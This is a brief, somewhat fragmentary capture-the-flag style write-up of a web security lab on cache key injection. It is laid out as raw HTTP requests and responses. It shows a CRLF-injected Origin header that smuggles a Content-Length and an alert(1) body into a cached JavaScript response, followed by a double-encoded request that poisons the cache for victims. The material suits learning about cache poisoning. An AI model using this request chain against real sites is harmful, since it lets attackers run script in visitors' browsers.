# **Cache key injection**

Task: This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.

To solve the lab, combine the vulnerabilities to execute `alert(1)` in the victim's browser. Note that you will need to make use of the `Pragma: x-get-cache-key` header in order to solve this lab.

Toolkit: Burpsuite,Browser

1. explore query params → utm\_content  
2. if we send a req

GET /login?lang=en?utm\_content=qwert HTTP/2  
Host: [0af500e904a0f2c680c1ccee00f700d0.web-security-academy.net](http://0af500e904a0f2c680c1ccee00f700d0.web-security-academy.net)

HTTP/2 302 Found  
Location: /login/?lang=en?utm\_content=qwert

Following redirection it reflects

-        \<link rel="canonical" href='//0af500e904a0f2c680c1ccee00f700d0.web-security-academy.net/login/?lang=en?utm\_content=qwert'/\>  \<title\>  
-                    \<script src='/js/[localize.js?lang=en?utm\_content=qwert\&cors=0](http://localize.js?lang=en?utm_content=qwert&cors=0)'\>\</script\>

but we have cors 0, so we will work with it

3. REQ

GET /login?lang=en?utm\_content=x HTTP/2  
Host: 0af500e904a0f2c680c1ccee00f700d0.web-security-academy.net  
Cookie: session=sDtFtnCXysuHNjI3Q5YXRrDUXrQQuALV; lang=en  
Pragma: x-get-cache-key

HTTP/2 302 Found  
Location: /login/?lang=en?utm\_content=x\&cors=1  
Vary: origin  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=35  
Age: 3  
X-Cache-Key: /login?lang=en?cors=1$$

4. 

first req we need with http1.1 is here: /js/[localize.js?lang=en?](http://localize.js?lang=en?utm_content=qwert&cors=0) with Origin: content-lenght:8 alert(1)

GET /js/localize.js?lang=en?utm\_content=x\&cors=1\&x=1 HTTP/2  
Host: 0af500e904a0f2c680c1ccee00f700d0.web-security-academy.net  
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$  
Cookie: session=sDtFtnCXysuHNjI3Q5YXRrDUXrQQuALV; lang=en

X-Cache: hit  
Connection: close  
Content-Length: 8

alert(1)

Second REQ to pass headers  
GET /login?lang=en?utm\_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
